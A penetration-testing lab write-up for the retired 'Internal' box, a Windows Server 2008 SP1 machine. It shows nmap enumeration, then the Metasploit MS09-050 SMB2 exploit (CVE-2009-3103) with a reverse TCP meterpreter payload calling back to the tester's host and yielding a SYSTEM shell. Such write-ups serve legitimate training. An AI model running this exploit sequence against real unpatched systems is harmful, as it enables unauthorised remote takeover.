---
machine: Internal
platform: Proving Grounds
category: Windows
difficulty: Easy
tags: [windows-server-2008, cve-2009-3103, ms09-050, smb2-negotiate, metasploit]
date: 2026-08-28
status: retired
summary: An aging Windows Server 2008 box — testing identification of an outdated SMB2 service version and exploitation of a well-known public remote-code-execution vulnerability for a direct SYSTEM shell.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/internal/nmap]
└─$ nmap-full target           
[*] Running fast port discovery on target...
[*] Open ports: 53,135,139,445,3389,5357,49152,49153,49154,49155,49156,49157,49158
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 09:08 -0400
Nmap scan report for target (192.168.189.40)
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-08-28T13:09:56+00:00
|_ssl-date: 2026-08-28T13:10:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-03-04T23:44:47
|_Not valid after:  2025-09-03T23:44:47
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m49s, median: 1s
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-28T06:09:55-07:00
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:28:b2 (VMware)
| smb2-time: 
|   date: 2026-08-28T13:09:55
|_  start_date: 2025-03-05T23:44:46

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.15 seconds

```

## Foothold

I look up the DNS return of the nmap scan as it seems particularly old and find that it is likely vulnerable to CVE-2009–3103.

I then look up a poc for CVE-2009–3103 and find a metasploit module for it: `exploit/windows/smb/ms09_050_smb2_negotiate_func_index`

I set the remote host and local host and let the exploit run. I get a system shell.

```bash
msf > search exploit/windows/smb/ms09_050_smb2_negotiate_func_index

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank  Check  Description
   -  ----                                                    ---------------  ----  -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index  2009-09-07       good  No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set rhost 192.168.189.40
rhost => 192.168.189.40
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set lhost 192.168.45.226
lhost => 192.168.45.226
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
[*] Started reverse TCP handler on 192.168.45.226:4444 
[*] 192.168.189.40:445 - Connecting to the target (192.168.189.40:445)...
[*] 192.168.189.40:445 - Sending the exploit packet (952 bytes)...
[*] 192.168.189.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (199238 bytes) to 192.168.189.40
[*] Meterpreter session 1 opened (192.168.45.226:4444 -> 192.168.189.40:49159) at 2026-08-28 09:17:39 -0400

meterpreter > shell
wProcess 4044 created.
Channel 1 created.
hMicrosoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We can retrieve the flag from the administrator's desktop. Box complete.
